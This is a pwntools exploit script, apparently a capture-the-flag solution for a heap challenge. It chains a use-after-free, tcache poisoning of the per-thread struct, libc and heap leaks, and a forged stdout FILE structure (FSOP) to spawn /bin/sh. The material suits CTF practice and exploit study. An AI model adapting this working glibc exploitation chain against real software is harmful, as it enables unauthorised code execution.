from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./vuln_patched')
gdb.attach(p, '''
    continue
''')

# p = remote('159.89.105.235', 10001)

# malloc a chunk at index (unused, 0-8) of size (0-0x300) with data (given size at most)
def add_memory(index, size, data):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Memory index: ", str(index).encode())
    p.sendlineafter(b"How vivid is this memory? ", str(size).encode())
    p.sendafter(b"What do you remember? ", data)

# modify data (malloc_usable_size at most) of chunk at index (used, 0-8)
def edit_memory(index, data):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"Which memory will you rewrite? ", str(index).encode())
    p.sendafter(b"Rewrite your memory: ", data)

# print out string data of chunk at index (used, 0-8)
def view_memory(index):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"Which memory do you wish to recall? ", str(index).encode())
    return p.recvline().rstrip()

# free a chunk at index (used, 0-8), 7 chunks can be freed at most and chunk pointer un-nulled (uaf)
def forget_memory(index):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"Which memory will you erase? ", str(index).encode())

glibc_e = ELF('./libc.so.6')

class TcachePerthreadStruct:
    def __init__(self):
        self.counts = [0]*64
        self.pointers = [0]*64
    def set_count(self, size, count):
        idx = (size-0x20) // 16
        self.counts[idx] = count
    def set_pointer(self, size, pointer):
        idx = (size-0x20) // 16
        self.pointers[idx] = pointer
    def set(self, size, pointer, count=1):
        self.set_pointer(size, pointer)
        self.set_count(size, count)
    def __bytes__(self):
        res = b''
        for count in self.counts:
            res += p16(count)
        for pointer in self.pointers:
            res += p64(pointer)
        return res

# Stage 1: leak heap base address
add_memory(0, 0xf8, b'A')  # heap_base_addr+0x2a0, for later use
add_memory(1, 0x288, b'A')  # heap_base_addr+0x3a0
add_memory(2, 0x288, b'A')  # heap_base_addr+0x630
forget_memory(1)  # heap_base_addr+0x3a0
forget_memory(2)  # heap_base_addr+0x630
# now tcache bin of size 0x290: heap_base_addr+0x630 -> heap_base_addr+0x3a0
heap_base_addr = u64(view_memory(1).ljust(8, b'\x00'))<<12
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: exploit tcache per thread struct to leak glibc base address
edit_memory(2, p64(((heap_base_addr+0x630)>>12)^(heap_base_addr+0x10)))  # heap_base_addr+0x630
# now tcache bin of size 0x290: heap_base_addr+0x10 -> heap_base_addr+0x3a0
add_memory(3, 0x288, b'A')  # heap_base_addr+0x630
# now tcache bin of size 0x290: heap_base_addr+0x10
fake_tcache_1 = TcachePerthreadStruct()
fake_tcache_1.set(0x100, heap_base_addr, 7)
add_memory(4, 0x288, bytes(fake_tcache_1))  # heap_base_addr+0x10
# now tcache bin of size 0x100 is considered filled with 7 chunks: heap_base_addr
# free chunk at index 0 into unsorted bin
forget_memory(0)  # heap_base_addr+0x2a0
glibc_base_addr = u64(view_memory(0).ljust(8, b'\x00'))-(glibc_e.symbols['main_arena']+96)
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 3: exploit tcache per thread struct to perform fsop
fake_tcache_2 = TcachePerthreadStruct()
fake_tcache_2.set(0x100, glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])
edit_memory(4, bytes(fake_tcache_2))  # heap_base_addr+0x10
# now tcache bin of size 0x100: glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']
fake_file = FileStructure(0)
fake_file.flags = 0x3b01010101010101
fake_file._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake_file._IO_buf_base = u64(b'/bin/sh\x00')
fake_file._IO_backup_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake_file._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake_file._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake_file._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake_file.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x28)+p64(0)*3
fake_file.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
# overwrite stdout to trigger fsop
add_memory(5, 0xf8, bytes(fake_file))  # glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']

p.interactive()

# 0xL4ugh{therapy_would've_been_easier_548af1c}